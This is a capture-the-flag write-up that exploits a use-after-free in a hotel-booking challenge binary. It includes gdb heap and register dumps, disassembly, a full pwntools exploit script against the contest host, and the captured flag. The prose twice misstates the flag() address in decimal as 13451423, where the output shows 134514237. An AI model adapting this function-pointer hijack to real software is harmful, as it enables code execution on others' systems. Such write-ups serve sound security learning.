### Solved by superkojiman

We're given a binary that allows us to add a room/suite, delete a room/suite, and print a booking. At first glance, this appears to be a heap based exploit. After poking around with the menu options, I was able to get it to crash with a double free corruption, and with a segmentation fault. The segmentation fault is what led to the exploitation. Here's how to trigger it:

```
1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$ 1
Name: aaaa
Suite number: 1111
Booked a suite!

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$ 3
Suite booking deleted!

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$ 2
Name: bbbb
Room number: 2222
Booked a room!

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$ 4
Segmentation fault (core dumped)
```

In short:
* book a suite
* delete booking
* book a room
* print booking

Examining the core, we see: 

```
$ gdb -q -c core
[New LWP 25058]
Core was generated by `./drumpf_eb9f02ed8dfc8aed3e311f4bc7aea372a403f184ccd568828eb0a99b3559a50c'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000008ae in ?? ()
```

So it crashed at 0x000008ae(). What's that? In base 10 it's 2222, the room number we entered. So it looks like we can make this jump to any function we like. A look at the registers show that EAX contains this value:

```
gdb-peda$ i r
eax            0x8ae    0x8ae
ecx            0xa      0xa
edx            0x816000c        0x816000c
ebx            0xf777d000       0xf777d000
esp            0xffc99ffc       0xffc99ffc
ebp            0xffc9a028       0xffc9a028
esi            0x0      0x0
edi            0x0      0x0
eip            0x8ae    0x8ae
eflags         0x10206  [ PF IF RF ]
cs             0x23     0x23
ss             0x2b     0x2b
ds             0x2b     0x2b
es             0x2b     0x2b
fs             0x0      0x0
gs             0x63     0x63
```

Let's have a look at what's going on here. The first step is to book a suite. Once it's booked, the heap looks like this:

```
db-peda$ x/20wx 0x085c0000
0x85c0000:      0x00000000      0x00000111      0x08048a84      0x61616161
0x85c0010:      0x0000000a      0x00000000      0x00000000      0x00000000
0x85c0020:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0030:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0040:      0x00000000      0x00000000      0x00000000      0x00000000
```

Couple of important things here:
* 0x85c0000 + 0x8 = function pointer to print_booking
* 0x85c0000 + 0xc = name of room

Next the booking is deleted. The heap looks like this after deletion:

```
gdb-peda$ x/20wx 0x085c0000
0x85c0000:      0x00000000      0x00021001      0x08048a84      0x61616161
0x85c0010:      0x0000000a      0x00000000      0x00000000      0x00000000
0x85c0020:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0030:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0040:      0x00000000      0x00000000      0x00000000      0x00000000
```

The booking has been deleted, but the data hasn't been zeroed out on the heap. Next a room is booked. Here's the heap after the booking:

```
gdb-peda$ x/20wx 0x085c0000
0x85c0000:      0x00000000      0x00000109      0x000008ae      0x62626262
0x85c0010:      0x0000000a      0x00000000      0x00000000      0x00000000
0x85c0020:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0030:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0040:      0x00000000      0x00000000      0x00000000      0x00000000
```

So we've overwritten the function pointer with 0x8ae, and the name with "bbbb". 0x8ae is 2222. So print_booking() is called next and the following happens:

```
=> 0x80489b6 <print_booking+17>:        mov    eax,ds:0x804b088
   0x80489bb <print_booking+22>:        test   eax,eax
   0x80489bd <print_booking+24>:        jne    0x80489e6 <print_booking+65>
```

0x804b088 in print_booking+17 is a structure to suite which in turn points to the heap:

```
gdb-peda$ x/wx 0x804b088
0x804b088 <suite>:      0x085c0008
gdb-peda$ x/10wx 0x085c0008
0x85c0008:      0x000008ae      0x62626262      0x0000000a      0x00000000
0x85c0018:      0x00000000      0x00000000      0x00000000      0x00000000
0x85c0028:      0x00000000      0x00000000
```

It appears that print_booking() will print bookings for a suite and a room. So we've got a use-after-free vulnerability here. Execution continues to here:

```
=> 0x80489ef <print_booking+74>:        mov    eax,ds:0x804b088
   0x80489f4 <print_booking+79>:        mov    eax,DWORD PTR [eax]
   0x80489f6 <print_booking+81>:        mov    edx,DWORD PTR ds:0x804b088
   0x80489fc <print_booking+87>:        add    edx,0x4
   0x80489ff <print_booking+90>:        mov    DWORD PTR [esp],edx
   0x8048a02 <print_booking+93>:        call   eax
```

This takes the value in 0x804b088, stores it in EAX, and then does a CALL EAX, which causes the segmentation fault. At this point, we've got execution control, so where to jump to? It turns out there's a function called flag() which returns the flag. It's located at 0x804863d, which is 13451423 in base 10.:

```
gdb-peda$ p flag
$3 = {<text variable, no debug info>} 0x804863d <flag>
gdb-peda$ p/d 0x804863d
$4 = 13451423
```

So all we have to do is set the room number to 13451423 and we should get the flag. Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *

r = remote("drumpf.vuln.icec.tf", 6502)
print r.recv()
print r.recv()


# book suite 1
buf = ""
buf += "1\n"
buf += "a"*8
buf += "\n"
buf += "1"*4
buf += "\n"
r.send(buf)
print r.recv()
print r.recv()

# delete suite 1
buf = ""
buf += "3\n"
r.send(buf)
print r.recv()
print r.recv()

# book room 1
buf = ""
buf += "2\n"
buf += "c"*8
buf += "\n"
buf += "134514237"        # address of flag() in base 10.
buf += "\n"
r.send(buf)
print r.recv()
print r.recv()

# print. this should call flag() instead of print_booking()
buf = ""
buf += "4\n"
r.send(buf)
print r.recv()
print r.recv()
```

And here it is in action:

```
$ ./sploit.py
[+] Opening connection to drumpf.vuln.icec.tf on port 6502: Done
 .----------------. .----------------. .----------------. .----------------. .----------------. .----------------.
| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
| |  ________    | | |  _______     | | | _____  _____ | | | ____    ____ | | |   ______     | | |  _________   | |
| |              | | |              | | |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------' '----------------' '----------------' '----------------'
          .----------------. .----------------. .---
-------------. .----------------. .----------------.
         | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
         | |  ____  ____  | | |     ____     | | |  _________   | | |  _________   | | |   _____      | |
         | | |_   ||   _| | | |   .'    `.   | | | |  _   _  |  | | | |_   ___  |  | | |  |_   _|     | |
         | |   | |__| |   | | |  /  .--.  \  | | | |_/ | | \_|  | | |   | |_  \_|  | | |    | |       | |
         | |   |  __  |   | | |  | |    | |  | | |     | |      | | |   |  _|  _   | | |    | |   _   | |
         | |  _| |  | |_  | | |  \  `--'  /  | | |    _| |_     | | |  _| |___/ |  | | |   _| |__/ |  | |
         | | |____||____| | | |   `.____.'   | | |   |_____|    | | | |_________|  | | |  |________|  | |
         | |              | | |              | | |              | | |              | | |              | |
         | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
          '----------------' '----------------' '----------------' '----------------' '----------------'


1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$
Name: Suite number: Booked a suite!

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$
Suite booking deleted!


1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$
Name:
Room number: Booked a room!

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$
IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}
v�S�i���v�O
Rooms number: 134905
Name: cccccccc
Rooms number: 134514237

1. Book a suite
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$
[*] Closed connection to drumpf.vuln.icec.tf port 6502
```

Flag: IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}